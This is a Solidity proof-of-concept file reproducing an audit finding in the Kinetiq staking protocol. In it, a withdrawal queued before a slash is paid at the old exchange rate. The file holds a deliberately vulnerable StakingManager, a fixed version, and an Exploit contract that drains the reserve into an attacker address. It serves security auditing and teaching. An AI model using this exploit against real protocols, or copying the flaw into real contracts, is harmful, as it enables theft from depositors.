// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * Kinetiq - [H-02] A withdrawal queued before a slash is paid at the old
 * exchange rate (Code4rena 2025-04-kinetiq, finding 58554).
 *
 * SYNTHETIC, CHEATCODE-FREE. queueWithdrawal stores
 *     hypeAmount = kHYPEToHYPE(postFeeKHYPE)
 * and confirmWithdrawal pays that stored amount. HYPE is an 18-decimal token
 * standing in for native HYPE so the run needs no pre-funded ether.
 *
 * 50 kHYPE queued at 1.5 locks 75 HYPE. 20 kHYPE remain. A slash cuts the
 * 105 HYPE reserve to 75. The early withdrawal still pays 75 and leaves 0
 * for the later 20 kHYPE, whose fresh quote is 21428571428571428571 wei.
 * The fixed confirm recomputes kHYPEToHYPE and both users are paid from the
 * 75 that remain.
 */

contract Hype {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract KHYPE {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }
}

contract StakingManager {
    struct WithdrawalRequest {
        uint256 hypeAmount;
        uint256 kHYPEAmount;
        uint256 kHYPEFee;
        uint256 timestamp;
    }

    Hype public hype;
    KHYPE public kHYPE;
    uint256 public totalHYPE;
    uint256 public totalKHYPE;
    mapping(address => uint256) public nextId;
    mapping(address => mapping(uint256 => WithdrawalRequest)) internal _withdrawalRequests;

    constructor(Hype _hype, KHYPE _kHYPE) {
        hype = _hype;
        kHYPE = _kHYPE;
    }

    function seed(uint256 hypeAmount, uint256 kSupply) external {
        totalHYPE = hypeAmount;
        totalKHYPE = kSupply;
    }

    function kHYPEToHYPE(uint256 kAmount) public view returns (uint256) {
        return kAmount * totalHYPE / totalKHYPE;
    }

    function owed(address user, uint256 withdrawalId) external view returns (uint256) {
        return _withdrawalRequests[user][withdrawalId].hypeAmount;
    }

    // Quoted queueWithdrawal body: the HYPE amount is snapshotted at queue time.
    function queueWithdrawal(uint256 kHYPEAmount) external returns (uint256 withdrawalId) {
        uint256 postFeeKHYPE = kHYPEAmount;
        uint256 kHYPEFee = 0;
        uint256 hypeAmount = kHYPEToHYPE(postFeeKHYPE);
        kHYPE.transferFrom(msg.sender, address(this), kHYPEAmount);
        withdrawalId = nextId[msg.sender];
        nextId[msg.sender] = withdrawalId + 1;
        _withdrawalRequests[msg.sender][withdrawalId] = WithdrawalRequest({
            hypeAmount: hypeAmount,
            kHYPEAmount: postFeeKHYPE,
            kHYPEFee: kHYPEFee,
            timestamp: block.timestamp
        });
    }

    function slash(uint256 amount) external {
        hype.burn(amount);
        totalHYPE -= amount;
    }

    function _processConfirmation(address user, uint256 withdrawalId) internal returns (uint256 amount) {
        WithdrawalRequest memory request = _withdrawalRequests[user][withdrawalId];
        amount = request.hypeAmount;
        require(amount > 0, "No valid withdrawal request");
        kHYPE.burn(request.kHYPEAmount);
        totalKHYPE -= request.kHYPEAmount;
        delete _withdrawalRequests[user][withdrawalId];
    }

    // Quoted confirmWithdrawal: pays the stored hypeAmount, not a fresh quote.
    function confirmWithdrawal(uint256 withdrawalId) external {
        uint256 amount = _processConfirmation(msg.sender, withdrawalId);
        require(amount > 0, "No valid withdrawal request");
        require(hype.balanceOf(address(this)) >= amount, "Insufficient contract balance");
        totalHYPE -= amount; // @> VULN: subtracts the pre-slash hypeAmount stored at queue time
        // amount is the hypeAmount stored at queue time, before the slash.
        hype.transfer(msg.sender, amount);
    }
}

contract StakingManagerFixed {
    struct WithdrawalRequest {
        uint256 hypeAmount;
        uint256 kHYPEAmount;
        uint256 kHYPEFee;
        uint256 timestamp;
    }

    Hype public hype;
    KHYPE public kHYPE;
    uint256 public totalHYPE;
    uint256 public totalKHYPE;
    mapping(address => uint256) public nextId;
    mapping(address => mapping(uint256 => WithdrawalRequest)) internal _withdrawalRequests;

    constructor(Hype _hype, KHYPE _kHYPE) {
        hype = _hype;
        kHYPE = _kHYPE;
    }

    function seed(uint256 hypeAmount, uint256 kSupply) external {
        totalHYPE = hypeAmount;
        totalKHYPE = kSupply;
    }

    function kHYPEToHYPE(uint256 kAmount) public view returns (uint256) {
        return kAmount * totalHYPE / totalKHYPE;
    }

    function queueWithdrawal(uint256 kHYPEAmount) external returns (uint256 withdrawalId) {
        uint256 postFeeKHYPE = kHYPEAmount;
        uint256 hypeAmount = kHYPEToHYPE(postFeeKHYPE);
        kHYPE.transferFrom(msg.sender, address(this), kHYPEAmount);
        withdrawalId = nextId[msg.sender];
        nextId[msg.sender] = withdrawalId + 1;
        _withdrawalRequests[msg.sender][withdrawalId] = WithdrawalRequest({
            hypeAmount: hypeAmount,
            kHYPEAmount: postFeeKHYPE,
            kHYPEFee: 0,
            timestamp: block.timestamp
        });
    }

    function slash(uint256 amount) external {
        hype.burn(amount);
        totalHYPE -= amount;
    }

    // FIX: ignore the stored hypeAmount and quote again at confirm time.
    function confirmWithdrawal(uint256 withdrawalId) external returns (uint256 amount) {
        WithdrawalRequest memory request = _withdrawalRequests[msg.sender][withdrawalId];
        require(request.kHYPEAmount > 0, "No valid withdrawal request");
        amount = kHYPEToHYPE(request.kHYPEAmount);
        require(hype.balanceOf(address(this)) >= amount, "Insufficient contract balance");
        kHYPE.burn(request.kHYPEAmount);
        totalKHYPE -= request.kHYPEAmount;
        totalHYPE -= amount;
        delete _withdrawalRequests[msg.sender][withdrawalId];
        hype.transfer(msg.sender, amount);
    }
}

contract LateUser {
    function approve(KHYPE token, address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function queue(StakingManager manager, uint256 amount) external {
        manager.queueWithdrawal(amount);
    }

    function queueFixed(StakingManagerFixed manager, uint256 amount) external {
        manager.queueWithdrawal(amount);
    }

    function confirm(StakingManager manager, uint256 id) external returns (bool ok) {
        try manager.confirmWithdrawal(id) {
            return true;
        } catch {
            return false;
        }
    }

    function confirmFixed(StakingManagerFixed manager, uint256 id) external returns (uint256 paid) {
        return manager.confirmWithdrawal(id);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    Hype public hype;
    KHYPE public kHype;
    StakingManager public manager;
    LateUser public late;
    uint256 public earlyPaid;
    uint256 public lateOwed;
    bool public lateConfirmed;

    function run() external {
        hype = new Hype(); // nonce 1
        kHype = new KHYPE(); // nonce 2
        manager = new StakingManager(hype, kHype); // nonce 3
        late = new LateUser(); // nonce 4

        kHype.mint(address(this), 50 ether);
        kHype.mint(address(late), 20 ether);
        hype.mint(address(manager), 105 ether);
        kHype.approve(address(manager), type(uint256).max);
        late.approve(kHype, address(manager));
        manager.seed(105 ether, 70 ether);

        manager.queueWithdrawal(50 ether);
        manager.slash(30 ether);
        late.queue(manager, 20 ether);
        lateOwed = manager.owed(address(late), 0);

        manager.confirmWithdrawal(0);
        earlyPaid = hype.balanceOf(address(this));
        hype.transfer(ATTACKER, earlyPaid);
        lateConfirmed = late.confirm(manager, 0);

        require(earlyPaid == 75 ether, "early took 75");
        require(lateOwed == 21_428_571_428_571_428_571, "late quote");
        require(lateConfirmed == false, "late paid");
        require(hype.balanceOf(address(manager)) == 0, "reserve empty");
        require(hype.balanceOf(ATTACKER) == 75 ether, "attacker");
    }
}
